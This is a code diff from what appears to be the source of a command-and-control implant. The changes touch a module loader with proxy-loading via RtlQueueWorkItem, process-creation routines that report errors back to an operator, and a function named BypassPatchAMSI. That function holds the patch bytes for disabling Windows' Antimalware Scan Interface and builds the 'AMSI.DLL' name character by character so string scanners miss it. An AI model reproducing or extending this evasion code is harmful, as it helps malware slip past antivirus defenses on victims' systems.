@@ -227,7 +227,6 @@ PVOID LdrModuleLoad(
                 goto DEFAULT;
             }
         }
-
         /* load library using RtlQueueWorkItem + LoadLibraryW */
         else if ( ( Instance.Config.Implant.ProxyLoading == PROXYLOAD_RTLQUEUEWORKITEM ) && Instance.Win32.RtlQueueWorkItem )
         {
@@ -267,6 +266,11 @@ PVOID LdrModuleLoad(
             /* decrease counter */
             Count--;
         } while ( TRUE );
+
+        /* if module still hasn't been found then go to default */
+        if ( ! Module ) {
+            goto DEFAULT;
+        }
     }
     else
     {
@@ -544,9 +548,7 @@ BOOL ProcessCreate(
                     lpCurrentDirectory,
                     &StartUpInfo,
                     ProcessInfo
-            )
-                    )
-            {
+            ) ) {
                 PRINTF( "CreateProcessWithLogonW: Failed [%d]\n", NtGetLastError() );
                 TokenImpersonate( TRUE );
                 PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
@@ -570,9 +572,7 @@ BOOL ProcessCreate(
                 NULL,
                 &StartUpInfo,
                 ProcessInfo
-        )
-                )
-        {
+        ) ) {
             PRINTF( "CreateProcessA: Failed [%d]\n", NtGetLastError() );
             PackageTransmitError( CALLBACK_ERROR_WIN32, NtGetLastError() );
             Return = FALSE;
@@ -714,8 +714,7 @@ BOOL ReadLocalFile(
         hFile = NULL;
     }
 
-    if ( ! Success && *FileContent )
-    {
+    if ( ! Success && *FileContent ) {
         Instance.Win32.LocalFree( *FileContent );
         *FileContent = NULL;
         *FileSize    = 0;
@@ -739,14 +738,14 @@ BOOL BypassPatchAMSI(
     unsigned char amsiPatch[] = { 0xB8, 0x57, 0x00, 0x07, 0x80, 0xC2, 0x18, 0x00 };//x86
 #endif
 
-    module[0] = 'a';
-    module[1] = 'm';
-    module[2] = 's';
-    module[3] = 'i';
+    module[0] = 'A';
+    module[1] = 'M';
+    module[2] = 'S';
+    module[3] = 'I';
     module[4] = '.';
-    module[5] = 'd';
-    module[6] = 'l';
-    module[7] = 'l';
+    module[5] = 'D';
+    module[6] = 'L';
+    module[7] = 'L';
     module[8] = 0;
 
     hModuleAmsi = LdrModuleLoad( module );
